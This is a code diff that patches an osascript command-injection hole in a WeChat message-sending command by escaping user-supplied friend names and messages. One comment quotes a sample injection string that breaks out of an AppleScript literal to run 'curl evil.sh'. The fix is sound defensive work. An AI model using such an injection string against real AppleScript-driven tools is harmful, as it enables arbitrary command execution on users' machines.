@@ -580,6 +580,21 @@ export default async function() {{
                 print_error("示例: /wechat send --friend 张三 --message 你好")
                 return
 
+            # 修复 #184 (osascript 注入 RCE): friend 原样拼进 AppleScript 字符串，
+            # 输入 `" & (do shell script "curl evil.sh") & "` 可执行任意命令。
+            # 修复: AppleScript 字符串字面量转义（\ "）+ 拒绝控制字符。
+            def _as_escape(s: str) -> str:
+                if any(ord(c) < 32 for c in s):
+                    raise ValueError("好友名/消息不能包含控制字符")
+                return s.replace("\\", "\\\\").replace('"', '\\"')
+
+            try:
+                friend = _as_escape(str(friend))
+                message = _as_escape(str(message))
+            except ValueError as e:
+                print_error(f"参数校验失败: {e}")
+                return
+
             think_start(f"发送微信消息给{friend}")
             think_analyze("微信消息发送")
             think_plan([
